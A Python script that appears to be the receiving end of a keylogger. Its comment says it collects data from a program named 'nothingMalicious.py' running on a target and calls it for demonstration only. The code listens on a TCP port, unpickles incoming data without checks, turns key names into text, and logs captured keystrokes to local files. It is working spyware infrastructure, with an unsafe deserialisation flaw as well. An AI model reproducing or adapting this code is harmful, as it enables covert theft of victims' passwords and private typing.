#listener that receives data from nothingMalicious.py running on target.
#This is to be used soley for demostration purposes.

import pickle
import socket
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("IP")
parser.add_argument("Port", type=int)
args = parser.parse_args()

keys = open("./kylog.txt", "w")
details = open("./kyDetails.txt", "w")

global buf
buf = ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", args.Port))
s.listen(1)

print("[+] Listening for connections on port: {0}".format(args.Port))

def stringFilter(string):
    a = string.replace("Return", "\r")
    b = a.replace("space", " ")
    c = b.replace("Shift_L", "")
    d = c.replace("Shift_R", "")
    e = d.replace("BackSpace", "\b")
    f = e.replace("Control_L", "")
    g = f.replace("Up", "")
    h = g.replace("Down", "")
    i = h.replace("Right", "")
    j = i.replace("Left", "")
    k = j.replace("period", ".")
    l = k.replace("Tab", "\t")
    m = l.replace("Alt_L", "")
    n = m.replace("semicolon", ";")
    return n 

def writeFile(f,string):
    for line in string:
        f.write(line)

while(True):
    conn,address=s.accept()
    data = conn.recv(512)
    dserData = pickle.loads(data)
    spyString = str(dserData)
    writeFile(details,spyString)
    details.write(spyString)
    parsedOutput = spyString[spyString.find("Pressed:")+8:].split()[0]
    finalOutput = stringFilter(parsedOutput)
    buf += finalOutput
    if "\r" in buf:
        for line in buf:
            print(line, end="")
        writeFile(details,spyString)
        writeFile(keys,buf)
        buf = ""
        print("\r")
